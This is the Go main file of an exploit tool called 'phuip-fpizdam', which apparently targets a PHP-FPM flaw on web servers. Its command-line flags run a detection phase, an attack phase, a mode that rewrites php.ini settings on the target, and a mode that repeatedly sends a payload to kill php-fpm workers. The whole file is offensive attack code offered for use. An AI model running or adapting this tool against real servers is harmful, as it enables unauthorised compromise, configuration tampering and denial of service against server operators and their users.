package main

import (
	"log"

	"github.com/spf13/cobra"
)

func main() {
	var (
		method       string
		cookie       string
		setting      string
		skipDetect   bool
		skipAttack   bool
		killWorkers  bool
		killCount    int
		resetSetting bool
		resetRetries int
		onlyQSL      bool
		params       = &AttackParams{}
	)

	var cmd = &cobra.Command{
		Use:  "phuip-fpizdam [url]",
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			url := args[0]
			m, ok := Methods[method]
			if !ok {
				log.Fatalf("Unknown detection method: %v", method)
			}

			requester, err := NewRequester(url, cookie)
			if err != nil {
				log.Fatalf("Failed to create requester: %v", err)
			}

			if resetSetting {
				if !params.Complete() {
					log.Fatal("--reset-setting requires complete params")
				}
				if setting == "" {
					setting = m.PHPOptionDisable
				}
				if resetRetries == -1 {
					resetRetries = 1 << 30
				}
				if err := SetSetting(requester, params, setting, resetRetries); err != nil {
					log.Fatalf("ResetSetting() returned error: %v", err)
				}
				log.Printf("I did my best trying to set %#v", setting)
				return
			}

			if setting != "" {
				log.Fatal("--setting requires --reset-setting")
			}

			if killWorkers {
				if params.QueryStringLength == 0 {
					log.Fatal("QSL value is required for killing workers")
				}
				// The breaking payload is 4 bytes shorter than usual (34), so we have
				// (Δ|SCRIPT_FILENAME| + Δ|REQUEST_URI| + Δ|DOCUMENT_URI|)/2 = 6.
				// This probably won't work in some configurations.
				params.QueryStringLength += 6
				if err := KillWorkers(requester, params, killCount); err != nil {
					log.Fatalf("KillWorkers() returned error: %v", err)
				}
				log.Printf("all done")
				return
			}

			if skipDetect {
				if !params.Complete() {
					log.Fatal("Got --skip-detect and attack params are incomplete, don't know what to do")
				}
				log.Printf("Using attack params %s", params)
			} else {
				var err error
				params, err = Detect(requester, m, params, onlyQSL)
				if err != nil {
					if err == errPisosBruteForbidden && onlyQSL {
						log.Printf("Detect() found QSLs and that's it")
						return
					}
					log.Fatalf("Detect() returned error: %v", err)
				}

				if !params.Complete() {
					log.Fatal("Detect() returned incomplete attack params, something gone wrong")
				}

				log.Printf("Detect() returned attack params: %s <-- REMEMBER THIS", params)
			}

			if skipAttack || onlyQSL {
				log.Print("Attack phase is disabled, so that's it")
				return
			}

			if err := Attack(requester, params); err != nil {
				log.Fatalf("Attack returned error: %v", err)
			}
		},
	}
	cmd.Flags().StringVar(&method, "method", "session.auto_start", "detect method (see detect_methods.go)")
	cmd.Flags().StringVar(&cookie, "cookie", "", "send this cookie")
	cmd.Flags().IntVar(&params.QueryStringLength, "qsl", 0, "qsl hint")
	cmd.Flags().IntVar(&params.PisosLength, "pisos", 0, "pisos hint")
	cmd.Flags().BoolVar(&skipDetect, "skip-detect", false, "skip detection phase")
	cmd.Flags().BoolVar(&skipAttack, "skip-attack", false, "skip attack phase")
	cmd.Flags().BoolVar(&onlyQSL, "only-qsl", false, "stop after QSL detection, use this if you just want to check if the server is vulnerable")
	cmd.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")
	cmd.Flags().IntVar(&resetRetries, "reset-retries", SettingEnableRetries, "how many retries to do for --reset-setting, -1 means a lot")
	cmd.Flags().StringVar(&setting, "setting", "", "specify custom php.ini setting for --reset-setting")
	cmd.Flags().BoolVar(&killWorkers, "kill-workers", false, "just kill php-fpm workers (requires only QSL)")
	cmd.Flags().IntVar(&killCount, "kill-count", SettingEnableRetries, "how many times to send the worker killing payload")

	if err := cmd.Execute(); err != nil {
		log.Fatal(err)
	}
}
